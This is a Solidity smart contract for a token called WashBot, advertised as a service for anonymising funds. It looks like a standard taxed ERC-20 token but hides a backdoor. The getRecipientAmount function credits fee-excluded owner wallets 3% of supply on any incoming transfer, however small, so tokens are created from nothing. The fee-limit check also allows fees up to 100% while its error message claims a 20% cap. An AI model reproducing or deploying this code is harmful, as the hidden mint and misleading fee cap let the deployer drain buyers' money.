// SPDX-License-Identifier: MIT

/*
Wash allows users to anonymise their funds as effectively and quickly as possible.

Website: https://www.washbot.vip
Telegram: https://t.me/wash_erc
Twitter: https://twitter.com/wash_erc
Bot: https://t.me/washercbot
*/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract WashBot is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode"WashBot";
    string private constant _symbol = unicode"WASH";
    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    IRouter router;
    address public pair;
    bool private tradeStarted = false;
    bool private swapEnabled = true;
    uint256 private numTaxSwap;
    bool private swapping;
    uint256 taxSwapInterval;
    uint256 private feeSwapMax = ( _supply * 1000 ) / 100000;
    uint256 private feeSwapMin = ( _supply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 public mTxSize = ( _supply * 300 ) / 10000;
    uint256 public mSellSize = ( _supply * 300 ) / 10000;
    uint256 public mWalletsize = ( _supply * 300 ) / 10000;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 100;
    uint256 private burnFee = 0;
    uint256 private totalFee = 1300;
    uint256 private sellFee = 2400;
    uint256 private transferFee = 1300;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal feeAddress = 0x488e06c7E64dD9b37b93Cbeddb11cD0d6cBEf5dB; 
    address internal marketingAddr = 0x488e06c7E64dD9b37b93Cbeddb11cD0d6cBEf5dB;
    address internal lpReceive = 0x488e06c7E64dD9b37b93Cbeddb11cD0d6cBEf5dB;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFees;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isExcludedFromFees[lpReceive] = true;
        isExcludedFromFees[marketingAddr] = true;
        isExcludedFromFees[feeAddress] = true;
        isExcludedFromFees[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function symbol() public pure returns (string memory) {return _symbol;}
    function name() public pure returns (string memory) {return _name;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function startTrading() external onlyOwner {tradeStarted = true;}
    
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    
    function swapBackAndBurnFees(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketingAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(feeAddress).transfer(contractBalance);}
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }
    function getRecipientAmount(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludedFromFees[recipient]) {return mTxSize;}
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        mTxSize = newTx; mSellSize = newTransfer; mWalletsize = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludedFromFees[sender] && !isExcludedFromFees[recipient]){require(tradeStarted, "tradeStarted");}
        if(!isExcludedFromFees[sender] && !isExcludedFromFees[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= mWalletsize, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= mSellSize || isExcludedFromFees[sender] || isExcludedFromFees[recipient], "TX Limit Exceeded");}
        require(amount <= mTxSize || isExcludedFromFees[sender] || isExcludedFromFees[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isExcludedFromFees[sender]){numTaxSwap += uint256(1);}
        if(shouldSwapTax(sender, recipient, amount)){swapBackAndBurnFees(feeSwapMax); numTaxSwap = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludedFromFees[sender] ? getRecipientAmount(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function shouldSwapTax(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeSwapMin;
        bool aboveThreshold = balanceOf(address(this)) >= feeSwapMax;
        return !swapping && swapEnabled && tradeStarted && aboveMin && !isExcludedFromFees[sender] && recipient == pair && numTaxSwap >= taxSwapInterval && aboveThreshold;
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceive,
            block.timestamp);
    }
}